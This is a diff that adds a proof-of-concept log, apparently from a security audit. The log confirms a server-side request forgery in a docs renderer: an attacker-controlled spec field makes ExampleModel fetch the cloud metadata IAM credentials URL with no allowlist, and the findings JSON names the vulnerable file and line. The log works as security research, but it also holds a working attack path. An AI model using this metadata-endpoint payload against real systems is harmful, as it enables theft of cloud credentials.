@@ -1,0 +1,12 @@
+--- variant 1 @ 2026-05-19T04:02:48Z ---
+[H5-PoC] Instantiating ExampleModel with attacker-controlled externalValue...
+[H5-PoC] SSRF target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[H5-PoC] ExampleModel.externalValueUrl resolved to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[H5-PoC] Calling getExternalValue() — this triggers bare fetch()...
+[H5-PoC] fetch() returned body: {"instance-id":"i-deadbeef","iam-role":"ssrf-victim-role"}
+[H5-PoC] Total fetch() calls intercepted: 1
+[H5-PoC] URLs dispatched to fetch(): ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
+[H5-PoC] SUCCESS: SSRF confirmed. fetch() dispatched to arbitrary internal URL.
+[H5-PoC] In a real browser, this request reaches the metadata endpoint.
+[H5-PoC] If CORS permits (or same-origin), the IAM credential body is rendered in the docs UI.
+{"status":"confirmed","evidence":"bare fetch() dispatched to http://169.254.169.254/latest/meta-data/iam/security-credentials/ with no allowlist check; ExampleModel.externalValueUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/; response body rendered: {\"instance-id\":\"i-deadbeef\",\"iam-role\":\"ssrf-victim-role\"}","notes":"ExampleModel.getExternalValue() at src/services/models/Example.ts:41 calls fetch() directly; no scheme/host validation; URL derived verbatim from spec externalValue field."}
